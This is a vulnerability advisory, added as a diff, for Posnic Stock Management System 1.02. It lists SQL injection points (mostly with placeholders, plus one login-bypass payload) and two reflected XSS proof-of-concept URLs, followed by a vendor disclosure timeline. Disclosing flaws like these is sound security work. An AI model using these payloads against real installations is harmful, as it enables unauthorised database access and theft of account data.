@@ -1,0 +1,127 @@
+# Exploit Title: Posnic Stock Management System 1.02 Multiple Vulnerabilities
+# Date: 26 Sep 2013
+# Vendor Homepage: http://www.posnic.com
+# Software Link: http://sourceforge.net/projects/stockmanagement/?source=directory
+# Version: 1.02
+# Tested on: Win 7/Backtrack
+# CVE :
+# Exploit Author: Sarahma Security
+# Author Homepage: http://sarahma.co.id
+# Author Email: research@sarahma.co.id
+
+========================
+SQL Injection
+========================
+Found on
+http://localhost/posnic/change_password.php 
+parameter : old_pass
+post data : change_pass=Save&confirm_pass=acUn3t1x&new_pass=acUn3t1x&old_pass=1{SQL_HERE}
+
+Found on
+http://localhost/posnic/forget_pass.php 
+parameter : name 
+Payload : 1' or 1 = '1
+
+Found on
+http://localhost/posnic/update_sales.php
+parameter : sid
+http://localhost/posnic/update_sales.php?sid=22{SQL_HERE}&table=stock_sales&return=view_sales.php
+
+Found on
+http://localhost/posnic/update_customer_details.php
+parameter : sid
+http://localhost/posnic/update_customer_details.php?sid=9{SQL_HERE}&table=customer_details&return=view_customers.php
+
+Found on
+http://localhost/posnic/update_purchase.php
+parameter : sid
+http://localhost/posnic/update_purchase.php?sid=SD263{SQL_HERE}&table=stock_entries&return=view_purchase.php
+
+Found on
+http://localhost/posnic/update_supplier.php
+parameter : sid
+http://localhost/posnic/update_supplier.php?sid=38{SQL_HERE}&table=supplier_details&return=view_supplier.php
+
+Found on
+http://localhost/posnic/update_stock.php
+parameter : sid
+http://localhost/posnic/update_stock.php?sid=35{SQL_HERE}&table=stock_details&return=view_product.php
+
+Found on
+http://localhost/posnic/update_payment.php
+parameter : sid
+http://localhost/posnic/update_payment.php?sid=SD266{SQL_HERE}&table=stock_entries&return=view_payments.php
+
+Found on
+http://localhost/posnic/view_sales.php 
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+http://localhost/posnic/view_customers.php
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+http://localhost/posnic/view_purchase.php 
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+http://localhost/posnic/view_supplier.php 
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+http://localhost/posnic/view_product.php 
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+http://localhost/posnic/view_payments.php 
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+========================
+XSS Vulnerability
+========================
+Found On
+http://localhost/posnic/forget_pass.php
+parameter : msg
+Ex :  http://localhost/posnic/forget_pass.php?msg=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
+
+Found On
+http://localhost/posnic/index.php
+parameter : msg
+http://localhost/posnic/index.php?msg=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E&type=error
+
+ 
+========================
+Solution :
+========================
+No Update Until This Advisory published
+ 
+========================
+Timeline:
+========================
+2013-09-19 Provided details vulnerability to vendor
+2013-09-22 Vendor Reply Message
+2013-09-25 No Response From Vendor
+2013-09-26 Advisory published
+
+
+###################################################################################################################
+
+  ______                                __                                       ______                      
+ /      \                              /  |                                     /      \                     
+/000000  |  ______    ______   ______  00 |____   _____  ____    ______        /000000  |  ______    _______ 
+00 \__00/  /      \  /      \ /      \ 00      \ /     \/    \  /      \       00 \__00/  /      \  /       |
+00      \  000000  |/000000  |000000  |0000000  |000000 0000  | 000000  |      00      \ /000000  |/0000000/ 
+ 000000  | /    00 |00 |  00/ /    00 |00 |  00 |00 | 00 | 00 | /    00 |       000000  |00    00 |00 |      
+/  \__00 |/0000000 |00 |     /0000000 |00 |  00 |00 | 00 | 00 |/0000000 |      /  \__00 |00000000/ 00 \_____ 
+00    00/ 00    00 |00 |     00    00 |00 |  00 |00 | 00 | 00 |00    00 |      00    00/ 00       |00       |
+ 000000/   0000000/ 00/       0000000/ 00/   00/ 00/  00/  00/  0000000/        000000/   0000000/  0000000/ 
+                                                                                                             
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+###################################################################################################################
+
